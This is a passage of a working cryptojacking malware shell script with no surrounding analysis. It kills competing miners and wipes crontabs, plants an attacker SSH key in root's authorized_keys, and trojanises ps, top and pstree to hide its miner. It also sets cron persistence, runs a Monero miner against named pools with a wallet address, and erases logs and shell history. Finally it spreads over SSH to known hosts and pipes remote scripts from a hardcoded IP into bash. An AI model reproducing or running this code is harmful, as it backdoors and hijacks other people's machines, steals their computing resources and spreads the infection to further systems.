rm -rf /dev/shm/.kerberods /usr/bin/config.json /usr/bin/exin /tmp/wc.conf /tmp/log_rot /tmp/apachiii /tmp/sustse /tmp/php /tmp/p2.conf /tmp/pprt /tmp/ppol /tmp/javax/config.sh /tmp/javax/sshd2 /tmp/.profile /tmp/1.so /tmp/kworkerds /tmp/kworkerds3 /tmp/kworkerdssx /tmp/xd.json /tmp/syslogd /tmp/syslogdb /tmp/65ccEJ7 /tmp/jmxx /tmp/2Ne80nA /tmp/dl /tmp/ddg /tmp/systemxlv /tmp/systemctI /tmp/.abc /tmp/osw.hb /tmp/.tmpleve /tmp/.tmpnewzz /tmp/.java /tmp/.omed /tmp/.tmpc /tmp/.tmpleve /tmp/.tmpnewzz /tmp/gates.lod /tmp/conf.n /tmp/devtool /tmp/devtools /tmp/fs /tmp/.rod /tmp/.rod.tgz /tmp/.rod.tgz.1 /tmp/.rod.tgz.2 /tmp/.mer /tmp/.mer.tgz /tmp/.mer.tgz.1 /tmp/.hod /tmp/.hod.tgz /tmp/.hod.tgz.1 /tmp/84Onmce /tmp/C4iLM4L /tmp/lilpip /tmp/3lmigMo /tmp/am8jmBP /tmp/tmp.txt /tmp/baby /tmp/.lib /tmp/systemd /tmp/lib.tar.gz /tmp/baby /tmp/java /tmp/j2.conf /tmp/.mynews1234 /tmp/a3e12d /tmp/.pt /tmp/.pt.tgz /tmp/.pt.tgz.1 /tmp/go /tmp/java /tmp/j2.conf /tmp/.tmpnewasss /tmp/java /tmp/go.sh /tmp/go2.sh /tmp/khugepageds /tmp/.censusqqqqqqqqq /tmp/.kerberods /tmp/kerberods /tmp/seasame /tmp/touch /tmp/.p /tmp/runtime2.sh /tmp/runtime.sh /dev/shm/z3.sh /dev/shm/z2.sh /dev/shm/.scr
rm -rf /etc/systemd/system/systemde.service*
rm -f /etc/ld.so.preload
rm -f /usr/local/lib/libioset.so
chattr -i /etc/ld.so.preload
systemctl stop moneroocean_miner.service
systemctl stop systemde.service
rm -f /usr/local/lib/libioset.so
rm -rf /tmp/watchdogs
rm -rf /etc/cron.d/tomcat
rm -rf /etc/rc.d/init.d/watchdogs
rm -rf /usr/sbin/watchdogs
rm -f /tmp/kthrotlds
rm -f /etc/rc.d/init.d/kthrotlds
rm -rf /tmp/.sysbabyuuuuu12
rm -rf /tmp/logo9.jpg
rm -rf /tmp/miner.sh
rm -rf /tmp/nullcrew
rm -rf /tmp/proc
rm -rf /tmp/2.sh
rm /opt/atlassian/confluence/bin/1.sh
rm /opt/atlassian/confluence/bin/1.sh.1
rm /opt/atlassian/confluence/bin/1.sh.2
rm /opt/atlassian/confluence/bin/1.sh.3
rm /opt/atlassian/confluence/bin/3.sh
rm /opt/atlassian/confluence/bin/3.sh.1
rm /opt/atlassian/confluence/bin/3.sh.2
rm /opt/atlassian/confluence/bin/3.sh.3
rm -rf /var/tmp/wc.conf /var/tmp/f41 /var/tmp/2.sh /var/tmp/config.json /var/tmp/xmrig /var/tmp/1.so /var/tmp/kworkerds3 /var/tmp/kworkerdssx /var/tmp/kworkerds
rm -rf /var/tmp/sustse3
rm -rf /var/tmp/sustse
rm -rf /var/tmp/moneroocean/
rm -rf /var/tmp/devtool
rm -rf /var/tmp/devtools
rm -rf /var/tmp/play.sh
rm -rf /var/tmp/systemctI
rm -rf /var/tmp/.java
rm -rf /var/tmp/1.sh
rm -rf /var/tmp/conf.n
rm -r /var/tmp/lib
rm -r /var/tmp/.lib
rm -rf /opt/systemd-service.sh
rm -rf /opt/.systemd-service.sh
rm -rf /root/.systemd-service.sh
#rm -rf /usr/share/\[crypto\]
chattr -R -ia /usr/bin/TeamTNT/*
chattr -R -ia /usr/bin/watchdogd*
rm -rf /usr/bin/watchdogd*
service crypto stop
systemctl stop crypto.service
systemctl stop watchdogd 
service watchdogd stop
rm -fr /usr/bin/TeamTNT/*
chattr -iau /tmp/lok
chmod +700 /tmp/lok
rm -rf /tmp/lok
sleep 1
chattr -i /tmp/kdevtmpfsi
echo 1 > /tmp/kdevtmpfsi
chattr +i /tmp/kdevtmpfsi
sleep 1
chattr -i /usr/lib/systemd/systemd-update-daily
echo 1 > /usr/lib/systemd/systemd-update-daily
chattr +i /usr/lib/systemd/systemd-update-daily
>/tmp/svcupdate
>/tmp/svcguard
>/etc/svcupdate
>/etc/svcguard
>/etc/cron.daily/logrotate
>/etc/cron.hourly/0anacron
>/etc/rc.d/rc.local
docker ps --filter "name=pocosow" --filter "name=gakeaws" --filter "name=azulu" --filter "name=auto" --filter "name=xmr" --filter "name=mine" --filter "name=slowhttp" --filter "name=bash.shell" --filter "name=entrypoint.sh" --filter "name=/var/sbin/bash" -q | xargs -r docker kill
docker images -a --filter "reference=pocosow" --filter "reference=gakeaws" --filter "reference=buster-slim" --filter "reference=hello-" --filter "reference=azulu" --filter "reference=registry" --filter "reference=xmr" --filter "reference=auto" --filter "reference=mine" --filter "reference=monero" --filter "reference=slowhttp" -q | xargs -r docker rmi -f
service apparmor stop
systemctl disable apparmor
service aliyun.service stop
systemctl disable aliyun.service
chattr -R -ia /usr/bin/TeamTNT/* /usr/bin/watchdogd* /var/spool/cron /etc/crontab /etc/cron.d /var/spool/cron/crontabs
chattr -iau /tmp/lok
chattr -i /tmp/kdevtmpfsi /usr/lib/systemd/systemd-update-daily
crontab -r
rm -rf /var/spool/cron/*
rm -rf /etc/cron.d/*
rm -rf /var/spool/cron/crontabs
rm -rf /etc/crontab
}
kill_miner_proc

kill_sus_proc()
{
    ps axf -o "pid"|while read procid
    do
            ls -l /proc/$procid/exe | grep /tmp
            if [ $? -ne 1 ]
            then
                    cat /proc/$procid/cmdline| grep -a -E "httpgd"
                    if [ $? -ne 0 ]
                    then
                            kill -9 $procid
                    else
                            echo "don't kill"
                    fi
            fi
    done
    ps axf -o pid,%cpu --sort=-%cpu | awk '$2 >= 40.0 {print $1}' | while read -r procid
    do
            cat /proc/$procid/cmdline| grep -a -E "httpgd"
            if [ $? -ne 0 ]
            then
                    kill -9 $procid
            else
                    echo "don't kill"
            fi
    done
}
kill_sus_proc

fuckyou(){

$(docker rm $(docker ps | grep -v grep | grep "/root/startup.sh" | awk '{print $1}') -f 2>/dev/null 1>/dev/null)
$(docker rm $(docker ps | grep -v grep | grep "tail -f /dev/null" | awk '{print $1}') -f 2>/dev/null 1>/dev/null)

rm -f /tmp/moneroocean/xmrig 2>/dev/null 1>/dev/null
pkill -f /tmp/moneroocean/xmrig 2>/dev/null 1>/dev/null
rm -fr /tmp/moneroocean/ 2>/dev/null 1>/dev/null
killall -9 xmrig 2>/dev/null 1>/dev/null

if [ -f /root/.tmp/xmrig ]; then
    chattr -i /root/.tmp/xmrig 2>/dev/null
    pkill -f /root/.tmp/xmrig 2>/dev/null
    tmpxmrigfile="/root/.tmp/miner.sh"
    rm -f $tmpxmrigfile 2>/dev/null
    pkill -f $tmpxmrigfile 2>/dev/null
    chmod +x $tmpxmrigfile 2>/dev/null
    chattr +i $tmpxmrigfile 2>/dev/null
    chmod -x /root/.tmp/xmrig 2>/dev/null
    rm -f /root/.tmp/xmrig 2>/dev/null
    chattr +i /root/.tmp/xmrig 2>/dev/null
    ps ax | grep xmrig 2>/dev/null 1>/dev/null
fi

KINSING1=$(ps ax | grep -v grep |  grep "/var/tmp/kinsing")
if [ ! -z "$KINSING1" ];
then
chattr -i /var/tmp/kinsing 2>/dev/null 1>/dev/null
chmod -x /var/tmp/kinsing 2>/dev/null 1>/dev/null
pkill -f /var/tmp/kinsing 2>/dev/null 1>/dev/null
kill $(ps ax | grep -v grep | grep "/var/tmp/kinsing" | awk '{print $1}') 2>/dev/null 1>/dev/null
kill $(pidof /var/tmp/kinsing) 2>/dev/null 1>/dev/null
echo " " > /var/tmp/kinsing 2>/dev/null 1>/dev/null
rm -f /var/tmp/kinsing 2>/dev/null 1>/dev/null
echo "fuckyou" > /var/tmp/kinsing
chattr +i /var/tmp/kinsing 2>/dev/null 1>/dev/null
history -c 2>/dev/null 1>/dev/null
fi

KINSING2=$(ps ax | grep -v grep |  grep "/tmp/kdevtmpfsi")
if [ ! -z "$KINSING2" ];
then
chattr -i /tmp/kdevtmpfsi 2>/dev/null 1>/dev/null
chmod -x /tmp/kdevtmpfsi 2>/dev/null 1>/dev/null
pkill -f /tmp/kdevtmpfsi 2>/dev/null 1>/dev/null
kill $(ps ax | grep -v grep | grep "/tmp/kdevtmpfsi" | awk '{print $1}') 2>/dev/null 1>/dev/null
kill $(pidof /tmp/kdevtmpfsi) 2>/dev/null 1>/dev/null
echo " " > /tmp/kdevtmpfsi 2>/dev/null 1>/dev/null
rm -f /tmp/kdevtmpfsi 2>/dev/null 1>/dev/null
echo "fuckyou" > /tmp/kdevtmpfsi
chattr +i /tmp/kdevtmpfsi 2>/dev/null 1>/dev/null
history -c 2>/dev/null 1>/dev/null
fi

}

fuckyou

downloads()
{
    if [ -f "/usr/bin/curl" ]
    then 
  echo $1,$2
        http_code=`curl -I -m 50 -o /dev/null -s -w %{http_code} $1`
        if [ "$http_code" -eq "200" ]
        then
            curl --connect-timeout 100 --retry 100 $1 > $2
        elif [ "$http_code" -eq "405" ]
        then
            curl --connect-timeout 100 --retry 100 $1 > $2
        else
            curl --connect-timeout 100 --retry 100 $3 > $2
        fi
    elif [ -f "/usr/bin/cd1" ]
    then
        http_code=`cd1 -I -m 50 -o /dev/null -s -w %{http_code} $1`
        if [ "$http_code" -eq "200" ]
        then
            cd1 --connect-timeout 100 --retry 100 $1 > $2
        elif [ "$http_code" -eq "405" ]
        then
            cd1 --connect-timeout 100 --retry 100 $1 > $2
        else
            cd1 --connect-timeout 100 --retry 100 $3 > $2
        fi
    elif [ -f "/usr/bin/wget" ]
    then
        wget --timeout=50 --tries=100 -O $2 $1
        if [ $? -ne 0 ]
  then
    wget --timeout=100 --tries=100 -O $2 $3
        fi
    elif [ -f "/usr/bin/wd1" ]
    then
        wd1 --timeout=100 --tries=100 -O $2 $1
        if [ $? -eq 0 ]
        then
            wd1 --timeout=100 --tries=100 -O $2 $3
        fi
    fi
}


unlock_cron()
{
    chattr -R -ia /var/spool/cron
    chattr -ia /etc/crontab
    chattr -R -ia /var/spool/cron/crontabs
    chattr -R -ia /etc/cron.d
}

lock_cron()
{
    chattr -R +ia /var/spool/cron
    chattr +ia /etc/crontab
    chattr -R +ia /var/spool/cron/crontabs
    chattr -R +ia /etc/cron.d
}

modify_binary() {
    local binary=$1
    local original="${binary}.original"
    
    if [ ! -f "$original" ]; then
        mv "$binary" "$original"
        echo "#! /bin/bash" > "$binary"
        echo "$original \$@ | grep -v \"httpgd\|pnscan\"" >> "$binary"
        chmod +x "$binary"
        touch -d 20160825 "$binary"
        echo "$binary modified"
    else
        echo "$binary already modified"
    fi
}

install_chattr_if_needed() {
    if [ ! -f "/bin/chattr" ] || [ "$(ls -l /bin/chattr | awk '{ print $5 }')" -lt "$chattr_size" ]; then
        yum -y remove e2fsprogs
        yum -y install e2fsprogs
    else
        echo "Chattr is installed correctly."
    fi
}

manage_cron() {
    unlock_cron
    rm -f "${crondir}" /etc/cron.d/httpgd /etc/crontab
    
    echo "*/50 * * * * sh /etc/nnt.sh >/dev/null 2>&1" >> "$crondir"
    echo "*/50 * * * * root sh /etc/nnt.sh >/dev/null 2>&1" >> /etc/cron.d/httpgd
    echo "0 1 * * * root sh /etc/nnt.sh >/dev/null 2>&1" >> /etc/crontab
    
    echo "Crontab created"
    lock_cron
}

ps_cmd="/bin/ps"
if [ ! -f "$ps_cmd.original" ]; then
    ps_cmd="ps"
fi

download_file_if_needed() {
    local url=$1
    local dest=$2
    local backup_url=$3
    
    if [ -f "$dest" ]; then
        local filesize=$(ls -l "$dest" | awk '{ print $5 }')
        if [ "$filesize" -ne "$miner_size" ]; then
            pkill -f httpgd
            rm "$dest"
            downloads "$url" "$dest" "$backup_url"
        else
            echo "$dest is up to date"
        fi
    else
        downloads "$url" "$dest" "$backup_url"
    fi
}

if [ -f "$rtdir" ]; then
    echo "I am root"
    mkdir -p /root/.ssh
    chmod 700 /root/.ssh/
    echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC3QgqCevA1UIX9jkWJNzaDHmCFQMCVn6DlhT8Tj1CcBLouOPpuBVqGoZem9UT/sdy563H+e1cQD6LRA9lgyBO8VBOuyjlPf/rdYeXZRv9eFZ4ROGCOX/dvNzV9XdEyPX+znEL4AS45ko0obSqNGbserHPcKtXBjjcf9zWtRvBA4lteyXENWeCST61OhVI0K7bNTUHsQhFC0rgiGFqVv+kIwMVauMxeNd5PjsES4C5P9G8Ynligmdxp7LdOFeb5/V/iO8eceQsxLyXVCe2Jue5gaaOIbKy2j2HPxj6qK2BUqlx+dJdat6HE2HyPWDKD5jPyA5RCSs1zphe7BQjH20cX1nyzbhxNNQncs5BfB0kk2Qcb9IS/ofX9p8zIVKLUHMUNC9mKqPljzxH/3wYnOZrgebS4uwfyad+6SQ1oRfs1vWotXxSz1hBjhRPpUqzA7J865AcSOZBaoRsRKZ1BaGMyJyjIfkecFgeDpmbHzOzCjIXAeh20S2wLYZGdrhgVEr0= uc1" > /root/.ssh/authorized_keys
    chmod 600 /root/.ssh/authorized_keys
    chattr +ia /root/.ssh/authorized_keys
    chattr -ia /etc/httpgd* /etc/nnt.sh* /root/.ssh/authorized_keys*
    chattr -R -ia /root/.ssh
    modify_binary "/bin/ps"
    modify_binary "/bin/top"
    modify_binary "/bin/pstree"
    install_chattr_if_needed
    manage_cron
    download_file_if_needed "$miner_url" "/etc/httpgd" "$miner_url_backup"
    download_file_if_needed "$sh_url" "/etc/nnt.sh" "$sh_url_backup"
    chmod 777 /etc/httpgd
    chattr +ia /etc/httpgd
    chmod 777 /etc/nnt.sh
    chattr +ia /etc/nnt.sh
    if ! $ps_cmd -fe | grep -q 'httpgd' | grep -v 'grep'; then
        cd /etc
        echo "root not runninng"
        sleep 5s
        ./httpgd --log-file=/etc/kta --keepalive --no-color --cpu-priority 5 -o dev.fugglesoft.me:5443 --tls -o 80.211.206.105:9000 -u 84nw3MQdDJzRghGBEPWNAtLG8MA1ek1itN42Yup4dPK38wnWGY7zxSR28j2n4vyLspVPoDCFeijap2NTQJfegCTeANTrzot.51 --coin monero --background &
    fi
    chmod 600 /root/.ssh/authorized_keys
    chattr +ia /root/.ssh/authorized_keys
else
    echo "goto 1" > /tmp/httpgds
    chattr -ia /tmp/httpgd* /tmp/nnt.sh*
    if [ ! -f "/usr/bin/crontab" ]; then
        unlock_cron
        echo "*/30 * * * * sh /tmp/nnt.sh >/dev/null 2>&1" >> "$crondir"
        lock_cron
    else
        unlock_cron
        [[ $cont =~ "nnt.sh" ]] || (crontab -l; echo "*/30 * * * * sh /tmp/nnt.sh >/dev/null 2>&1") | crontab -
        lock_cron
    fi
    chmod 700 ~/.ssh/
    echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC3QgqCevA1UIX9jkWJNzaDHmCFQMCVn6DlhT8Tj1CcBLouOPpuBVqGoZem9UT/sdy563H+e1cQD6LRA9lgyBO8VBOuyjlPf/rdYeXZRv9eFZ4ROGCOX/dvNzV9XdEyPX+znEL4AS45ko0obSqNGbserHPcKtXBjjcf9zWtRvBA4lteyXENWeCST61OhVI0K7bNTUHsQhFC0rgiGFqVv+kIwMVauMxeNd5PjsES4C5P9G8Ynligmdxp7LdOFeb5/V/iO8eceQsxLyXVCe2Jue5gaaOIbKy2j2HPxj6qK2BUqlx+dJdat6HE2HyPWDKD5jPyA5RCSs1zphe7BQjH20cX1nyzbhxNNQncs5BfB0kk2Qcb9IS/ofX9p8zIVKLUHMUNC9mKqPljzxH/3wYnOZrgebS4uwfyad+6SQ1oRfs1vWotXxSz1hBjhRPpUqzA7J865AcSOZBaoRsRKZ1BaGMyJyjIfkecFgeDpmbHzOzCjIXAeh20S2wLYZGdrhgVEr0= uc1" > ~/.ssh/authorized_keys
    chmod 600 ~/.ssh/authorized_keys
    download_file_if_needed "$miner_url" "/tmp/httpgd" "$miner_url_backup"
    download_file_if_needed "$sh_url" "/tmp/nnt.sh" "$sh_url_backup"
    if ! $ps_cmd -fe | grep -q 'httpgd' | grep -v 'grep'; then
        cd /tmp
        echo "user not running"
        sleep 5s
        ./httpgd --keepalive --no-color --cpu-priority 5 -o dev.fugglesoft.me:5443 --tls -o 80.211.206.105:9000 -u 84nw3MQdDJzRghGBEPWNAtLG8MA1ek1itN42Yup4dPK38wnWGY7zxSR28j2n4vyLspVPoDCFeijap2NTQJfegCTeANTrzot.51 --coin monero --background &
    fi
    echo "user running..."
    chmod 777 /tmp/httpgd
    chattr +i /tmp/httpgd
    chmod 777 /tmp/nnt.sh
    chattr +i /tmp/nnt.sh
fi

iptables -F
iptables -X
iptables -A OUTPUT -p tcp --dport 7777 -j DROP
iptables -A OUTPUT -p tcp --dport 9999 -j DROP
service iptables reload
history -c
echo > /var/spool/mail/root
echo > /var/log/wtmp
echo > /var/log/secure
echo > /root/.bash_history
chmod 444 /usr/bin/chattr
chmod 444 /bin/chattr
yum install -y bash 2>/dev/null
apt install -y bash 2>/dev/null
apt-get install -y bash 2>/dev/null
if [ -f /root/.ssh/known_hosts ] && [ -f /root/.ssh/id_rsa.pub ]; then
  for h in $(grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" /root/.ssh/known_hosts); do ssh -oBatchMode=yes -oConnectTimeout=5 -oStrictHostKeyChecking=no $h 'curl -o-  http://103.79.77.16/ep9TS2/ndt.sh | bash >/dev/null 2>&1 &' & done
fi
if [ -f /root/.ssh/known_hosts ] && [ -f /root/.ssh/id_rsa.pub ]; then
  for h in $(grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" /root/.ssh/known_hosts); do ssh -oBatchMode=yes -oConnectTimeout=5 -oStrictHostKeyChecking=no $h 'cd1 -o-  http://103.79.77.16/ep9TS2/ndt.sh | bash >/dev/null 2>&1 &' & done
fi
echo "$bbdir"
echo "$bbdira"

$bbdir -fsSL http://103.79.77.16/ep9TS2/is.sh | bash
$bbdira -fsSL http://103.79.77.16/ep9TS2/is.sh | bash
